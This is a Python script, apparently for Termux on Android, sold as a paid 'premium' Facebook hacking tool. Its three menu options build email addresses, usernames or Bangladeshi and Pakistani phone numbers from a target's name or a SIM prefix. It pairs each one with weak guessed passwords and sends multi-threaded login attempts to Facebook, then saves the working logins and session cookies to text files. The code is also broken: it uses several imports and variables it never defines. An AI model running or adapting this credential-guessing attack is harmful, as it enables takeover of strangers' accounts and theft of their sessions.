import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;96m' # 

H = '\033[1;94m' # 

K = '\x1b[1;93m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

        

def main_apv():

    imt="110Y=="

    ak="RIFAT_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("༄•───────────────────────────────────────•༄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄•───────────────────────────────────────•༄")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ("༄•───────────────────────────────────────•༄")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("༄•───────────────────────────────────────•༄")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/01738813664?text=' + tks)

        

    r1=requests.get("https://github.com/khanbrother420/Premium/blob/main/Approval.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL RIFAT")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄•───────────────────────────────────────•༄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/01738813664?text=' + tks)

logo ="""   
\033[1;96m
██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
██║░██╔╝██║░░██║██╔══██╗████╗░██║
█████═╝░███████║███████║██╔██╗██║
██╔═██╗░██╔══██║██╔══██║██║╚████║
██║░╚██╗██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

 
\033[1;91m\033[1;41m\033[1;97m        IT’S NOT JUST A NAME. IT'S A BRAND       \033[;0m\033[1;91m\033[1;92m


\033[1;92m══════════════════════════════════════════
\033[1;92m[-] TOOLS TYPE:\033[1;32m Premium 2.0
\033[1;92m[-] AUTHOR    :\033[1;32m KHAN OFFICIAL 
\033[1;92m[-] GITHUB    :\033[1;32m KhanBrother420
\033[1;92m[-] FACEBOOK  :\033[1;32m Mr.KhanVau420
\033[1;92m══════════════════════════════════════════
	
\033[1;96m            ___           _,.---,---.,_
            |         ,;~'             '~;, 
            |       ,;                     ;,      
   Frontal  |      ;                         ; ,--- Mr.KhanVau420 
    Bone    |     ,'                         /'
            |    ,;                        /' ;,
            |    ; ;      .           . <-'  ; |
            |__  | ;   ______       ______   ;<----- Coronal Suture
           ___   |  '/~"     ~" . "~     "~\'  |
           |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 Maxilla,  |      |   |        }:{        | <------ Freedom in the 
Nasal and  |      |   l       / | \       !   |         Sky
Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~. 
  Bones    |      |    ----;' / | \ `;-<--------- Infraorbital Foramen
           |__     \__.       \/^\/       .__/  
              ___   V| \                 / |V <--- Mastoid Process 
              |      | |T~\___!___!___/~T| |  
              |      | |`IIII_I_I_I_IIII'| |  
     Mandible |      |  \,III I I I III,/  | 
              |       \   `~~~~~~~~~~'    /
              |         \   .       . <-x---- Mental Foramen
              |__         \.    ^    ./   
                            ^~~~^~~~^
			    
 
\033[1;91m<═══\033[1;41m\033[1;97mI  am  S y s t e m  maker \033[;0m\033[1;91m═══>\033[1;92m""")


try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="Khan"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get(" https://github.com/khanbrother420/premium-2.0/blob/main/Approval.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print
	
	
	
	
	
	
	
	
	
	
	
    print("Your key  : "+key2)
    print("\n\t\tContact Admin Type👉 python premium.py ⚠ Enter ")
	
	
    os.system('xdg-open https://www.facebook.com/Mr.KhanVau420')
    exit()

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;97m[1] FACEBOOK EMAIL ID HACK     \033[1;91m[WORKING] ")
        print(" \033[1;97m[2] FACEBOOK USERNAME HACK      \033[1;35m[BEST]")
        print(" \033[1;97m[3] FACEBOOK VIP RANDOM HACK   \033[1;33m[FIRE]")
	
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
	
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TERGET FIRST NAME : ')
    kodex = input(' [🔥] TERGET LAST NAME :  ')
    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(' [📧]  Input Doamin  : ')
    limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [🆔]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [⚠️]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[⏸️  The process has been started')
        print(' [☢️]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [🍀] Crack process has been completed')
    print(' [🍀] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [🔥]  TERGET FIRST NAME : ')
    kodex = input(' [🔥] TERGET LAST NAME :  ')
    doamin = '.'
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [🆔]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [⚠️]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[⏸️]  The process has been started')
        print(' [☢️]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [✅] Crack process has been completed')
    print(' [📋] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID HACKED")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;33m[🔰]  TOTAL IDS :\033[1;92m '+tl)
        print(f"\033[1;33m[🔰]  YOUR TERGET CLONE MENU:\033[1;92m {doamin}")
        print(' \033[1;33m[🔰]  THE CLONE PROCESS HAS BEEN STARTED')
        print(' \033[1;33m[☢]  WAIT FOR IDS ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [✅] Crack process has been completed')
    print(' [📋] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mKHAN\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = { 'authority': 'www.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'max-age=0', # 'cookie': 'sb=gN0kZJxcwlQyq5RHCSI2a34P; fr=0TUK1I6VjfVAiggKJ..BkJN2A.oa.AAA.0.0.BkJN2A.AWVcif-sfzI; wd=980x1942; datr=gN0kZNfiolLabMkGdm7wzrQS; dpr=2.15625', 'referer': 'https://www.google.com/', 'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'cross-site', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5', } 
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[KHAN-OK🥰] {uid}|{ps}")
                print(f"\n[COOKIE👽] : {coki}")
                open('/sdcard/KHAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[KHAN-CP🥺] {uid}|{ps}")
                open('/sdcard/KHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[KHAN-BROTHER🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()

    


   

    
